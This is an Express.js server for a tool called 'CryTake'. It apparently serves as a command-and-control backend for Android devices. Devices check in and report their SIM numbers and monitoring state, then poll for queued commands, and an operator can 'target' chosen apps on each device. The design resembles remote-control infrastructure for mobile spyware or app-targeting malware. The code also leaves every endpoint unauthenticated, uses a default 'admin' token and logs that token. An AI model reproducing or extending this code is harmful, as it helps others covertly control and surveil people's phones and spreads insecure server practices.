const express = require('express');
const path = require('path');
const crypto = require('crypto');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const ADMIN_TOKEN = process.env.ADMIN_TOKEN || 'admin';

// Store registered devices: { [deviceId]: { name, model, androidVersion, lastSeen, simNumbers, isDndOn, isMonitoring, connectedAt } }
const registeredDevices = {};

// Store pending commands per device: { [deviceId]: [{ type, payload, timestamp }] }
const queuedCommands = {};

// Generate a unique device ID
function generateDeviceId() {
  return 'dev_' + crypto.randomBytes(4).toString('hex').toUpperCase();
}

// Check admin authorization
function isAdmin(req) {
  const token = req.headers['x-admin-token'] || req.query.adminToken || req.body.adminToken;
  return token === ADMIN_TOKEN;
}

// Serve dashboard
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// API: List all registered devices
app.get('/api/devices', (req, res) => {
  const devices = Object.values(registeredDevices)
    .sort((a, b) => new Date(b.lastSeen).getTime() - new Date(a.lastSeen).getTime());
  
  res.json(devices);
});

// API: Get specific device info
app.get('/api/devices/:deviceId', (req, res) => {
  const device = registeredDevices[req.params.deviceId];
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  res.json(device);
});

// API: Queue a command for a device
app.post('/api/command', (req, res) => {
  const { deviceId, commandType, payload } = req.body;
  
  if (!deviceId || !commandType) {
    return res.status(400).json({ error: 'deviceId and commandType are required' });
  }
  
  const commands = queuedCommands[deviceId] || [];
  commands.push({
    type: commandType,
    payload: JSON.stringify(payload || {}),
    timestamp: Date.now()
  });
  queuedCommands[deviceId] = commands;
  
  res.json({ 
    success: true, 
    message: `Command "${commandType}" queued for device ${deviceId}`,
    commandId: commands.length - 1
  });
});

// API: Device check-in (called by app on startup)
app.post('/api/checkin/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const { name, model, androidVersion, simNumbers } = req.body;
  
  // Create or update device record
  registeredDevices[deviceId] = {
    id: deviceId,
    name: name || `Device ${deviceId}`,
    model: model || 'Unknown',
    androidVersion: androidVersion || 'Unknown',
    simNumbers: simNumbers || [],
    lastSeen: new Date().toISOString(),
    connectedAt: registeredDevices[deviceId]?.connectedAt || new Date().toISOString(),
    isDndOn: registeredDevices[deviceId]?.isDndOn || false,
    isMonitoring: registeredDevices[deviceId]?.isMonitoring || true,
    online: true
  };
  
  Log(`📱 Device checked in: ${deviceId} (${name || 'Unknown'})`);
  
  res.json({ 
    success: true, 
    message: 'Check-in successful',
    commands: queuedCommands[deviceId] || []
  });
});

// Command polling endpoint - devices poll this for pending commands
app.get('/api/poll/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  
  // Update device last seen
  if (registeredDevices[deviceId]) {
    registeredDevices[deviceId].lastSeen = new Date().toISOString();
    registeredDevices[deviceId].online = true;
  }
  
  // Get and clear pending commands
  const commands = queuedCommands[deviceId] || [];
  queuedCommands[deviceId] = [];
  
  res.json({ commands, timestamp: Date.now() });
});

// API: Get device status
app.get('/api/status', (req, res) => {
  const deviceCount = Object.keys(registeredDevices).length;
  const onlineCount = Object.values(registeredDevices).filter(d => d.online).length;
  const offlineCount = deviceCount - onlineCount;
  
  res.json({
    name: 'CryTake API',
    status: 'running',
    version: '2.0.0',
    devices: {
      total: deviceCount,
      online: onlineCount,
      offline: offlineCount
    },
    timestamp: new Date().toISOString()
  });
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ status: 'healthy', timestamp: Date.now() });
});

// API: Send target app command
app.post('/api/target/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const { appId, action } = req.body;
  
  if (!appId) {
    return res.status(400).json({ error: 'appId is required' });
  }
  
  if (action === 'target') {
    queuedCommands[deviceId] = queuedCommands[deviceId] || [];
    queuedCommands[deviceId].push({
      type: 'target_app',
      payload: JSON.stringify({ appId }),
      timestamp: Date.now()
    });
    
    res.json({ success: true, message: `Target command queued for ${appId}` });
  } else if (action === 'untarget') {
    queuedCommands[deviceId] = queuedCommands[deviceId] || [];
    queuedCommands[deviceId].push({
      type: 'untarget_app',
      payload: JSON.stringify({ appId }),
      timestamp: Date.now()
    });
    
    res.json({ success: true, message: `Untarget command queued for ${appId}` });
  } else {
    res.status(400).json({ error: 'Invalid action. Use "target" or "untarget".' });
  }
});

// Cleanup offline devices
setInterval(() => {
  const now = Date.now();
  for (const [deviceId, device] of Object.entries(registeredDevices)) {
    const lastSeen = new Date(device.lastSeen).getTime();
    if (now - lastSeen > 60000) { // 1 minute offline threshold
      device.online = false;
    }
  }
}, 30000);

function Log(message) {
  console.log(`[${new Date().toISOString()}] ${message}`);
}

// Start server
if (!process.env.VERCEL) {
  const PORT = process.env.PORT || 3000;
  app.listen(PORT, () => {
    Log(`🌐 CryTake Dashboard API server running on port ${PORT}`);
    Log(`📲 Admin token: ${ADMIN_TOKEN}`);
  });
}

module.exports = app;
